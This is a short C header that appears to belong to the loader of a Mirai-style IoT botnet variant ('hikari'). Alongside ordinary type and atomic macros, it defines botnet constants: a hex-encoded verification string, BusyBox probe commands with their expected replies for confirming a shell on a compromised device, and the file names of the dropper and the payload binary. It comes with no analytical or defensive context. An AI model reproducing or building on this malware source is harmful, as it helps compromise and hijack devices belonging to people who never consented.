#pragma once

#include <stdint.h>

#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define FALSE 0
#define TRUE 1
typedef char BOOL;

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#define ATOMIC_ADD(ptr,i) __sync_fetch_and_add((ptr),i)
#define ATOMIC_SUB(ptr,i) __sync_fetch_and_sub((ptr),i)
#define ATOMIC_INC(ptr) ATOMIC_ADD((ptr),1)
#define ATOMIC_DEC(ptr) ATOMIC_SUB((ptr),1)
#define ATOMIC_GET(ptr) ATOMIC_ADD((ptr),0)

#define VERIFY_STRING_HEX   "\\x68\\x69\\x62\\x69\\x6b\\x69"
#define VERIFY_STRING_CHECK "hibiki"

#define TOKEN_QUERY     "/bin/busybox LIGHT"
#define TOKEN_RESPONSE  "LIGHT: applet not found"

#define EXEC_QUERY     "/bin/busybox DARK"
#define EXEC_RESPONSE  "DARK: applet not found"

#define FN_DROPPER "hikaridropper"
#define FN_BINARY "hikariwashere"
